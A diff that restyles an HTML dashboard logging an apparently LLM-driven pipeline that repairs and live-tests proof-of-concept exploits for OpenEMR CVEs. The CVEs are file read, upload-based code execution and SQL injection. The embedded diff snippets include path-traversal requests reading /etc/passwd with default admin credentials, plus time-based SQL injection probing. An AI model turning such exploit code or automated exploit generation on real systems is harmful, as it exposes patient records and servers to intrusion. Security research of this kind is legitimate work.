@@ -9,107 +9,108 @@
 
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body {
-  background: #0a0f1e; color: #cbd5e1;
+  background: #ffffff; color: #1f2328;
   font-family: 'IBM Plex Sans', system-ui, sans-serif;
   font-size: 0.875rem; padding: 28px 32px;
 }
 h1 {
-  font-size: 1.35rem; font-weight: 600; color: #e2e8f0;
+  font-size: 1.3rem; font-weight: 600; color: #111827;
   font-family: 'IBM Plex Mono', monospace;
-  letter-spacing: -0.01em;
-  margin-bottom: 4px;
+  letter-spacing: -0.01em; margin-bottom: 4px;
 }
-.subtitle { color: #475569; font-size: 0.75rem; margin-bottom: 24px; font-family: 'IBM Plex Mono', monospace; }
+.subtitle { color: #636c76; font-size: 0.75rem; margin-bottom: 24px; font-family: 'IBM Plex Mono', monospace; }
 
-.summary-bar { display: flex; gap: 14px; margin-bottom: 28px; flex-wrap: wrap; }
+.summary-bar { display: flex; gap: 12px; margin-bottom: 28px; flex-wrap: wrap; }
 .stat {
-  background: #0f1a2e; border: 1px solid #1e293b;
+  background: #ffffff; border: 1px solid #d0d7de;
+  border-left: 3px solid #d0d7de;
   border-radius: 6px; padding: 14px 22px; min-width: 110px;
 }
 .stat-val {
-  font-size: 1.65rem; font-weight: 600; color: #e2e8f0; line-height: 1.1;
+  font-size: 1.65rem; font-weight: 600; color: #1f2328; line-height: 1.1;
   font-family: 'IBM Plex Mono', monospace;
 }
-.stat-lbl { font-size: 0.68rem; color: #64748b; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.08em; }
-.stat.green .stat-val { color: #4ade80; }
-.stat.red   .stat-val { color: #f87171; }
-.stat.blue  .stat-val { color: #7dd3fc; }
+.stat-lbl { font-size: 0.68rem; color: #636c76; margin-top: 4px; letter-spacing: 0.02em; font-family: 'IBM Plex Sans', sans-serif; }
+.stat.green { border-left-color: #1a7f37; }
+.stat.green .stat-val { color: #1a7f37; }
+.stat.red   { border-left-color: #cf222e; }
+.stat.red   .stat-val { color: #cf222e; }
+.stat.blue  { border-left-color: #0969da; }
+.stat.blue  .stat-val { color: #0969da; }
 
 .cve-card {
-  background: #0d1525; border: 1px solid #1e293b;
-  border-radius: 8px; margin-bottom: 12px; overflow: hidden;
+  background: #ffffff; border: 1px solid #d0d7de;
+  border-radius: 6px; margin-bottom: 8px; overflow: hidden;
 }
 .cve-header {
   display: flex; justify-content: space-between; align-items: center;
-  padding: 13px 18px; cursor: pointer; user-select: none;
-  transition: background 0.12s;
+  padding: 12px 16px; cursor: pointer; user-select: none;
+  transition: background 0.1s;
 }
-.cve-header:hover { background: #131e35; }
+.cve-header:hover { background: #f6f8fa; }
 .cve-title { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
 .cve-id {
-  font-size: 0.95rem; font-weight: 600; color: #93c5fd;
-  font-family: 'IBM Plex Mono', monospace;
-  letter-spacing: 0.02em;
+  font-size: 0.92rem; font-weight: 600; color: #0969da;
+  font-family: 'IBM Plex Mono', monospace; letter-spacing: 0.02em;
 }
 .status-pass {
-  background: #052e16; color: #4ade80;
-  padding: 2px 10px; border-radius: 4px; font-size: 0.65rem; font-weight: 600;
-  font-family: 'IBM Plex Mono', monospace; letter-spacing: 0.04em;
+  background: #dafbe1; color: #1a7f37; border: 1px solid #aceebb;
+  padding: 2px 9px; border-radius: 12px; font-size: 0.68rem; font-weight: 500;
+  font-family: 'IBM Plex Sans', sans-serif;
 }
 .status-fail {
-  background: #2d0a0a; color: #f87171;
-  padding: 2px 10px; border-radius: 4px; font-size: 0.65rem; font-weight: 600;
-  font-family: 'IBM Plex Mono', monospace; letter-spacing: 0.04em;
+  background: #ffebe9; color: #cf222e; border: 1px solid #ffcecb;
+  padding: 2px 9px; border-radius: 12px; font-size: 0.68rem; font-weight: 500;
+  font-family: 'IBM Plex Sans', sans-serif;
 }
 .meta-tag {
-  background: #1e293b; color: #94a3b8;
-  padding: 2px 8px; border-radius: 3px; font-size: 0.67rem;
-  font-family: 'IBM Plex Sans', sans-serif;
+  background: #eaeef2; color: #57606a; border: 1px solid #d0d7de;
+  padding: 1px 7px; border-radius: 3px; font-size: 0.67rem;
+  font-family: 'IBM Plex Mono', monospace;
 }
-.meta-class { background: #1e3a5f; color: #7dd3fc; }
+.meta-class { background: #ddf4ff; color: #0969da; border-color: #b6e3ff; }
+.meta-name { color: #57606a; font-size: 0.72rem; font-family: 'IBM Plex Sans', sans-serif; }
 .cve-meta-right {
   display: flex; align-items: center; gap: 14px;
-  color: #475569; font-size: 0.72rem;
+  color: #636c76; font-size: 0.71rem;
   font-family: 'IBM Plex Mono', monospace;
 }
-.chevron { font-size: 0.7rem; color: #475569; transition: transform 0.2s; display: inline-block; }
+.chevron { font-size: 0.65rem; color: #636c76; transition: transform 0.18s; display: inline-block; }
 .cve-card.open .chevron { transform: rotate(180deg); }
-.cve-body { display: none; padding: 0 18px 20px; }
+.cve-body { display: none; padding: 0 16px 18px; border-top: 1px solid #d0d7de; }
 .cve-card.open .cve-body { display: block; }
 
-.log-table { width: 100%; border-collapse: collapse; font-size: 0.75rem; margin-top: 10px; }
+.log-table { width: 100%; border-collapse: collapse; font-size: 0.74rem; margin-top: 12px; }
 .log-table th {
-  background: #111e33; color: #7dd3fc;
-  text-align: left; padding: 8px 10px;
-  border-bottom: 1px solid #1e293b;
-  font-weight: 500; font-size: 0.65rem;
-  text-transform: uppercase; letter-spacing: 0.07em;
-  font-family: 'IBM Plex Sans', sans-serif;
+  background: #f6f8fa; color: #57606a;
+  text-align: left; padding: 7px 10px;
+  border-bottom: 1px solid #d0d7de;
+  font-weight: 600; font-size: 0.65rem;
+  letter-spacing: 0.04em; font-family: 'IBM Plex Sans', sans-serif;
 }
-.log-table td { padding: 8px 10px; border-bottom: 1px solid #131e33; vertical-align: top; }
+.log-table td { padding: 8px 10px; border-bottom: 1px solid #eaeef2; vertical-align: top; }
 .log-table tr:last-child td { border-bottom: none; }
-.nowrap { white-space: nowrap; color: #94a3b8; font-family: 'IBM Plex Mono', monospace; font-size: 0.72rem; }
+.nowrap { white-space: nowrap; color: #57606a; font-family: 'IBM Plex Mono', monospace; font-size: 0.71rem; }
 .center { text-align: center; }
-.mono { font-family: 'IBM Plex Mono', monospace; font-size: 0.7rem; color: #94a3b8; }
+.mono { font-family: 'IBM Plex Mono', monospace; font-size: 0.69rem; color: #57606a; }
 .comment-cell { font-size: 0.72rem; max-width: 340px; line-height: 1.7; }
-.lbl-err { color: #f87171; font-weight: 600; font-size: 0.63rem; text-transform: uppercase; letter-spacing: 0.07em; font-family: 'IBM Plex Mono', monospace; }
-.lbl-fix { color: #4ade80; font-weight: 600; font-size: 0.63rem; text-transform: uppercase; letter-spacing: 0.07em; font-family: 'IBM Plex Mono', monospace; }
-.sep { border: none; border-top: 1px solid #2d3f5c; margin: 7px 0; }
-.muted { color: #475569; }
-.badge { padding: 2px 9px; border-radius: 3px; font-size: 0.65rem; font-weight: 600; font-family: 'IBM Plex Mono', monospace; }
-.badge-pass { background: #052e16; color: #4ade80; }
-.badge-fail { background: #2d0a0a; color: #f87171; }
-.show-btn { cursor: pointer; font-size: 0.7rem; color: #60a5fa; list-style: none; font-family: 'IBM Plex Mono', monospace; }
-.show-btn:hover { color: #93c5fd; }
+.lbl-err { color: #cf222e; font-weight: 600; font-size: 0.63rem; letter-spacing: 0.04em; font-family: 'IBM Plex Sans', sans-serif; }
+.lbl-fix { color: #1a7f37; font-weight: 600; font-size: 0.63rem; letter-spacing: 0.04em; font-family: 'IBM Plex Sans', sans-serif; }
+.sep { border: none; border-top: 1px solid #eaeef2; margin: 7px 0; }
+.muted { color: #8c959f; }
+.badge { padding: 2px 8px; border-radius: 3px; font-size: 0.65rem; font-weight: 500; font-family: 'IBM Plex Sans', sans-serif; }
+.badge-pass { background: #dafbe1; color: #1a7f37; border: 1px solid #aceebb; }
+.badge-fail { background: #ffebe9; color: #cf222e; border: 1px solid #ffcecb; }
+.show-btn { cursor: pointer; font-size: 0.7rem; color: #0969da; list-style: none; font-family: 'IBM Plex Sans', sans-serif; }
+.show-btn:hover { text-decoration: underline; }
 .diff-pre {
-  white-space: pre-wrap;
-  font-family: 'IBM Plex Mono', monospace;
-  font-size: 0.67rem; line-height: 1.55;
-  margin-top: 8px; max-height: 200px; overflow-y: auto;
-  background: #070c18; padding: 10px 12px;
-  border-radius: 4px; border: 1px solid #1e293b;
+  white-space: pre-wrap; font-family: 'IBM Plex Mono', monospace;
+  font-size: 0.67rem; line-height: 1.55; margin-top: 8px;
+  max-height: 200px; overflow-y: auto;
+  background: #f6f8fa; padding: 10px 12px;
+  border-radius: 4px; border: 1px solid #d0d7de; color: #1f2328;
 }
-.no-data { color: #475569; font-size: 0.78rem; padding: 12px 0; font-family: 'IBM Plex Mono', monospace; }
+.no-data { color: #636c76; font-size: 0.78rem; padding: 12px 0; font-family: 'IBM Plex Mono', monospace; }
 </style>
 </head>
 <body>
@@ -128,8 +129,8 @@ h1 {
   <div class="cve-header" onclick="toggle(this)">
     <div class="cve-title">
       <span class="cve-id">CVE-2018-15142</span>
-      <span class="status-pass">CONFIRMED</span>
-      <span class="meta-tag meta-class">file_read</span> <span class="meta-tag">EDB-45202</span> <span class="meta-tag">OpenEMR prior to 5.0.1.4 Authenticated Arbitrary File Read via import_</span>
+      <span class="status-pass">Confirmed</span>
+      <span class="meta-tag meta-class">file_read</span> <span class="meta-tag">EDB-45202</span> <span class="meta-name">OpenEMR prior to 5.0.1.4 Authenticated Arbitrary File Read via import_</span>
     </div>
     <div class="cve-meta-right">
       <span class="iter-count">5 entries</span>
@@ -138,7 +139,7 @@ h1 {
     </div>
   </div>
   <div class="cve-body">
-    <table class="log-table"><thead><tr><th>Timestamp</th><th>Stage</th><th>Iteration</th><th>SHA</th><th>Result</th><th>Comments</th><th>Difference</th></tr></thead><tbody><tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 16:42:47</td><td>M3 PoC Fix</td><td class="center">1</td><td class="center mono">c4a36c32</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+    <table class="log-table"><thead><tr><th>Timestamp</th><th>Stage</th><th>Iteration</th><th>SHA</th><th>Result</th><th>Comments</th><th>Difference</th></tr></thead><tbody><tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 16:42:47</td><td>M3 PoC Fix</td><td class="center">1</td><td class="center mono">c4a36c32</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,9 +56,9 @@ def login(sess, base, site, user, password):
@@ -168,7 +169,7 @@ h1 {
 +    r = sess.get(base + VULN_ENDPOINT,
 +                  params={&quot;mode&quot;: &quot;get&quot;, &quot;docid&quot;: traversal},
                    timeout=20, verify=False)
-     body = r.text<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>--- a/poc.py
+     body = r.text<hr class="sep"><span class="lbl-fix">Changes made</span><br>--- a/poc.py
 +++ b/poc.py
 @@ -56,9 +56,9 @@ def login(sess, base, site, user, password):
  
@@ -195,7 +196,7 @@ h1 {
 +                  params={&quot;mode&quot;: &quot;get&quot;, &quot;docid&quot;: traversal},
                    timeout=20, verify=False)
      body = r.text</pre></details></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 16:42:59</td><td>M3 PoC Fix</td><td class="center">2</td><td class="center mono">3c1fea81</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 16:42:59</td><td>M3 PoC Fix</td><td class="center">2</td><td class="center mono">3c1fea81</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -68,7 +68,7 @@ def main():
@@ -217,7 +218,7 @@ h1 {
      ap.add_argument(&quot;-u&quot;, &quot;--user&quot;, default=&quot;admin&quot;, help=&quot;OpenEMR username (default: admin)&quot;)
 -    ap.add_argument(&quot;-p&quot;, &quot;--password&quot;, required=True, help=&quot;OpenEMR password&quot;)
 +    ap.add_argument(&quot;-p&quot;, &quot;--password&quot;, default=&quot;pass&quot;, help=&quot;OpenEMR password (default: pass)&quot;)
-     ap.add_argument(&quot;-s&quot;, &quot;--site&quot;, default=&quot;default&quot;, help=&quot;OpenEMR site (d<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>--- a/poc.py
+     ap.add_argument(&quot;-s&quot;, &quot;--site&quot;, default=&quot;default&quot;, help=&quot;OpenEMR site (d<hr class="sep"><span class="lbl-fix">Changes made</span><br>--- a/poc.py
 +++ b/poc.py
 @@ -68,7 +68,7 @@ def main():
          description=&quot;OpenEMR &lt; 5.0.1.4 authenticated arbitrary file read (CVE-2018-15142)&quot;)
@@ -238,7 +239,7 @@ h1 {
      ap.add_argument(&quot;-s&quot;, &quot;--site&quot;, default=&quot;default&quot;, help=&quot;OpenEMR site (default: default)&quot;)
      ap.add_argument(&quot;-f&quot;, &quot;--probe-file&quot;, default=&quot;/etc/passwd&quot;,
                      help=&quot;Absolute path of the remote file to read (default: /etc/passwd)&quot;)</pre></details></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 16:43:11</td><td>M3 PoC Fix</td><td class="center">3</td><td class="center mono">2cc9fb49</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 16:43:11</td><td>M3 PoC Fix</td><td class="center">3</td><td class="center mono">2cc9fb49</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -68,7 +68,7 @@ def main():
@@ -262,7 +263,7 @@ h1 {
      ap.add_argument(&quot;-u&quot;, &quot;--user&quot;, default=&quot;admin&quot;, help=&quot;OpenEMR username (default: admin)&quot;)
 -    ap.add_argument(&quot;-p&quot;, &quot;--password&quot;, default=&quot;pass&quot;, help=&quot;OpenEMR password (default: pass)&quot;)
 +    ap.add_argument(&quot;-P&quot;, &quot;--password&quot;, default=&quot;pass&quot;, help=&quot;OpenEMR password (default: pass)&quot;)
-     ap.add_argument(&quot;-s&quot;<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>--- a/poc.py
+     ap.add_argument(&quot;-s&quot;<hr class="sep"><span class="lbl-fix">Changes made</span><br>--- a/poc.py
 +++ b/poc.py
 @@ -68,7 +68,7 @@ def main():
      ap = argparse.ArgumentParser(
@@ -285,7 +286,7 @@ h1 {
      ap.add_argument(&quot;-s&quot;, &quot;--site&quot;, default=&quot;default&quot;, help=&quot;OpenEMR site (default: default)&quot;)
      ap.add_argument(&quot;-f&quot;, &quot;--probe-file&quot;, default=&quot;/etc/passwd&quot;,
                      help=&quot;Absolute path of the remote file to</pre></details></td></tr>
-<tr style="background:rgba(20,83,45,0.35);"><td class="nowrap">2026-10-15 16:45:24</td><td>M3 PoC Fix</td><td class="center">4</td><td class="center mono">4cec3430</td><td class="center"><span class="badge badge-pass">PASS</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#f0fdf4;"><td class="nowrap">2026-10-15 16:45:24</td><td>M3 PoC Fix</td><td class="center">4</td><td class="center mono">4cec3430</td><td class="center"><span class="badge badge-pass">Pass</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -55,9 +55,9 @@ def login(sess, base, site, user, password):
@@ -315,7 +316,7 @@ h1 {
 +    r = sess.post(base + VULN_ENDPOINT,
 +                  data={&quot;mode&quot;: &quot;get&quot;, &quot;docid&quot;: traversal},
                    timeout=20, verify=False)
-     body = r.t<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>--- a/poc.py
+     body = r.t<hr class="sep"><span class="lbl-fix">Changes made</span><br>--- a/poc.py
 +++ b/poc.py
 @@ -55,9 +55,9 @@ def login(sess, base, site, user, password):
  
@@ -342,15 +343,15 @@ h1 {
 +                  data={&quot;mode&quot;: &quot;get&quot;, &quot;docid&quot;: traversal},
                    timeout=20, verify=False)
      body = r.text</pre></details></td></tr>
-<tr style="background:rgba(20,83,45,0.35);"><td class="nowrap">2026-10-15 16:45:31</td><td>generate_module</td><td class="center">1</td><td class="center mono">4cec3430</td><td class="center"><span class="badge badge-pass">PASS</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>chi1=PASS chi2=PASS | chi1_out=Syntax OK | chi2_errors=[]<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>openemr_cve_2018_15142_file_read.rb</td><td><details><summary class="show-btn">&#9656; show</summary><pre class="diff-pre">openemr_cve_2018_15142_file_read.rb</pre></details></td></tr></tbody></table>
+<tr style="background:#f0fdf4;"><td class="nowrap">2026-10-15 16:45:31</td><td>generate_module</td><td class="center">1</td><td class="center mono">4cec3430</td><td class="center"><span class="badge badge-pass">Pass</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>chi1=PASS chi2=PASS | chi1_out=Syntax OK | chi2_errors=[]<hr class="sep"><span class="lbl-fix">Changes made</span><br>openemr_cve_2018_15142_file_read.rb</td><td><details><summary class="show-btn">&#9656; show</summary><pre class="diff-pre">openemr_cve_2018_15142_file_read.rb</pre></details></td></tr></tbody></table>
   </div>
 </div>
 <div class="cve-card">
   <div class="cve-header" onclick="toggle(this)">
     <div class="cve-title">
       <span class="cve-id">CVE-2026-24849</span>
-      <span class="status-pass">CONFIRMED</span>
-      <span class="meta-tag">EDB-52610</span> <span class="meta-tag">OpenEMR prior to 7.0.4 Authenticated Arbitrary File Read</span>
+      <span class="status-pass">Confirmed</span>
+      <span class="meta-tag meta-class">file_read</span> <span class="meta-tag">EDB-52610</span> <span class="meta-name">OpenEMR prior to 7.0.4 Authenticated Arbitrary File Read</span>
     </div>
     <div class="cve-meta-right">
       <span class="iter-count">3 entries</span>
@@ -359,17 +360,17 @@ h1 {
     </div>
   </div>
   <div class="cve-body">
-    <table class="log-table"><thead><tr><th>Timestamp</th><th>Stage</th><th>Iteration</th><th>SHA</th><th>Result</th><th>Comments</th><th>Difference</th></tr></thead><tbody><tr style="background:rgba(20,83,45,0.35);"><td class="nowrap">2026-10-15 17:02:39</td><td>M1 PoC Run</td><td class="center">1</td><td class="center mono"></td><td class="center"><span class="badge badge-pass">PASS</span></td><td class="comment-cell"><span class="muted">—</span></td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(20,83,45,0.35);"><td class="nowrap">2026-10-15 17:02:43</td><td>generate_module</td><td class="center">1</td><td class="center mono">3cc1016c</td><td class="center"><span class="badge badge-pass">PASS</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>chi1=PASS chi2=PASS | chi1_out=Syntax OK | chi2_errors=[]<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>openemr_cve_2026_24849_file_read.rb</td><td><details><summary class="show-btn">&#9656; show</summary><pre class="diff-pre">openemr_cve_2026_24849_file_read.rb</pre></details></td></tr>
-<tr style="background:rgba(20,83,45,0.35);"><td class="nowrap">2026-10-15 17:04:15</td><td>module_live_test</td><td class="center">1</td><td class="center mono"></td><td class="center"><span class="badge badge-pass">PASS</span></td><td class="comment-cell"><span class="muted">—</span></td><td><span class="muted">—</span></td></tr></tbody></table>
+    <table class="log-table"><thead><tr><th>Timestamp</th><th>Stage</th><th>Iteration</th><th>SHA</th><th>Result</th><th>Comments</th><th>Difference</th></tr></thead><tbody><tr style="background:#f0fdf4;"><td class="nowrap">2026-10-15 17:02:39</td><td>M1 PoC Run</td><td class="center">1</td><td class="center mono"></td><td class="center"><span class="badge badge-pass">Pass</span></td><td class="comment-cell"><span class="muted">—</span></td><td><span class="muted">—</span></td></tr>
+<tr style="background:#f0fdf4;"><td class="nowrap">2026-10-15 17:02:43</td><td>generate_module</td><td class="center">1</td><td class="center mono">3cc1016c</td><td class="center"><span class="badge badge-pass">Pass</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>chi1=PASS chi2=PASS | chi1_out=Syntax OK | chi2_errors=[]<hr class="sep"><span class="lbl-fix">Changes made</span><br>openemr_cve_2026_24849_file_read.rb</td><td><details><summary class="show-btn">&#9656; show</summary><pre class="diff-pre">openemr_cve_2026_24849_file_read.rb</pre></details></td></tr>
+<tr style="background:#f0fdf4;"><td class="nowrap">2026-10-15 17:04:15</td><td>module_live_test</td><td class="center">1</td><td class="center mono"></td><td class="center"><span class="badge badge-pass">Pass</span></td><td class="comment-cell"><span class="muted">—</span></td><td><span class="muted">—</span></td></tr></tbody></table>
   </div>
 </div>
 <div class="cve-card">
   <div class="cve-header" onclick="toggle(this)">
     <div class="cve-title">
       <span class="cve-id">CVE-2018-15139</span>
-      <span class="status-pass">CONFIRMED</span>
-      <span class="meta-tag meta-class">rce_upload</span> <span class="meta-tag">EDB-50122</span> <span class="meta-tag">OpenEMR prior to 5.0.1.4 Authenticated Remote Code Execution via File </span>
+      <span class="status-pass">Confirmed</span>
+      <span class="meta-tag meta-class">rce_upload</span> <span class="meta-tag">EDB-50122</span> <span class="meta-name">OpenEMR prior to 5.0.1.4 Authenticated Remote Code Execution via File </span>
     </div>
     <div class="cve-meta-right">
       <span class="iter-count">1 entries</span>
@@ -378,15 +379,15 @@ h1 {
     </div>
   </div>
   <div class="cve-body">
-    <table class="log-table"><thead><tr><th>Timestamp</th><th>Stage</th><th>Iteration</th><th>SHA</th><th>Result</th><th>Comments</th><th>Difference</th></tr></thead><tbody><tr style="background:rgba(20,83,45,0.35);"><td class="nowrap">2026-10-15 17:24:32</td><td>generate_module</td><td class="center">1</td><td class="center mono">7b6b6544</td><td class="center"><span class="badge badge-pass">PASS</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>chi1=PASS chi2=PASS | chi1_out=Syntax OK | chi2_errors=[]<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>openemr_cve_2018_15139_exploit.rb</td><td><details><summary class="show-btn">&#9656; show</summary><pre class="diff-pre">openemr_cve_2018_15139_exploit.rb</pre></details></td></tr></tbody></table>
+    <table class="log-table"><thead><tr><th>Timestamp</th><th>Stage</th><th>Iteration</th><th>SHA</th><th>Result</th><th>Comments</th><th>Difference</th></tr></thead><tbody><tr style="background:#f0fdf4;"><td class="nowrap">2026-10-15 17:24:32</td><td>generate_module</td><td class="center">1</td><td class="center mono">7b6b6544</td><td class="center"><span class="badge badge-pass">Pass</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>chi1=PASS chi2=PASS | chi1_out=Syntax OK | chi2_errors=[]<hr class="sep"><span class="lbl-fix">Changes made</span><br>openemr_cve_2018_15139_exploit.rb</td><td><details><summary class="show-btn">&#9656; show</summary><pre class="diff-pre">openemr_cve_2018_15139_exploit.rb</pre></details></td></tr></tbody></table>
   </div>
 </div>
 <div class="cve-card">
   <div class="cve-header" onclick="toggle(this)">
     <div class="cve-title">
       <span class="cve-id">CVE-2018-15149</span>
-      <span class="status-fail">NOT CONFIRMED</span>
-      <span class="meta-tag meta-class">sqli</span> <span class="meta-tag">OpenEMR prior to 5.0.1.4 SQL Injection in encounter parameter</span>
+      <span class="status-fail">Not Confirmed</span>
+      <span class="meta-tag meta-class">sqli</span> <span class="meta-name">OpenEMR prior to 5.0.1.4 SQL Injection in encounter parameter</span>
     </div>
     <div class="cve-meta-right">
       <span class="iter-count">45 entries</span>
@@ -395,7 +396,7 @@ h1 {
     </div>
   </div>
   <div class="cve-body">
-    <table class="log-table"><thead><tr><th>Timestamp</th><th>Stage</th><th>Iteration</th><th>SHA</th><th>Result</th><th>Comments</th><th>Difference</th></tr></thead><tbody><tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:32:23</td><td>M3 PoC Fix</td><td class="center">1</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+    <table class="log-table"><thead><tr><th>Timestamp</th><th>Stage</th><th>Iteration</th><th>SHA</th><th>Result</th><th>Comments</th><th>Difference</th></tr></thead><tbody><tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:32:23</td><td>M3 PoC Fix</td><td class="center">1</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 Looking at this PoC failure, the SQL injection isn&#x27;t being detected because:
 1. The eye_mag module may not be installed/accessible
 2. The timing threshold is too strict
@@ -443,7 +444,7 @@ Here&#x27;s the fix:
 +        # Try to set patient context
 +        for pid in [&quot;1&quot;, &quot;2&quot;]:
 +            ctx_url = urljoin(target</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:33:10</td><td>M3 PoC Fix</td><td class="center">2</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:33:10</td><td>M3 PoC Fix</td><td class="center">2</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -56,16 +56,22 @@ def test_sqli(session, target, site, delay=3):
@@ -494,7 +495,7 @@ Here&#x27;s the fix:
 -        try:
 -            check = session.get(vuln_url, params={&quot;encounter&quot;: &quot;1&quot;, &quot;pid&quot;: &quot;1&quot;}, verify=False, timeout=10)
 -</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:34:01</td><td>M3 PoC Fix</td><td class="center">3</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:34:01</td><td>M3 PoC Fix</td><td class="center">3</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -55,17 +55,23 @@ def test_sqli(session, target, site, delay=3):
@@ -541,7 +542,7 @@ Here&#x27;s the fix:
  
      # Test each endpoint with each payload
      for endpoint in vu</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:34:44</td><td>M3 PoC Fix</td><td class="center">4</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:34:44</td><td>M3 PoC Fix</td><td class="center">4</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -54,17 +54,22 @@ def test_sqli(session, target, site, delay=3):
@@ -589,7 +590,7 @@ Here&#x27;s the fix:
  
 -    # Test each endpoint with each payload
 +    # Low</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:35:25</td><td>M3 PoC Fix</td><td class="center">5</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:35:25</td><td>M3 PoC Fix</td><td class="center">5</td><td class="center mono">45ebac92</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -60,6 +60,15 @@ def test_sqli(session, target, site, delay=3):
@@ -645,7 +646,7 @@ Here&#x27;s the fix:
 -
 -            except requests.Timeout:
 -</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 17:36:00</td><td>M3 PoC Fix</td><td class="center">6</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 17:36:00</td><td>M3 PoC Fix</td><td class="center">6</td><td class="center mono">5b2fb6cc</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -60,13 +60,6 @@ def test_sqli(session, target, site, delay=3):
@@ -705,7 +706,7 @@ Here&#x27;s the fix:
  
      payloads = [
 @@ -95,7 +88,8 @@ def test_sqli(session, target, site, delay=3):</td><td><span class="muted">—</span></td></tr>
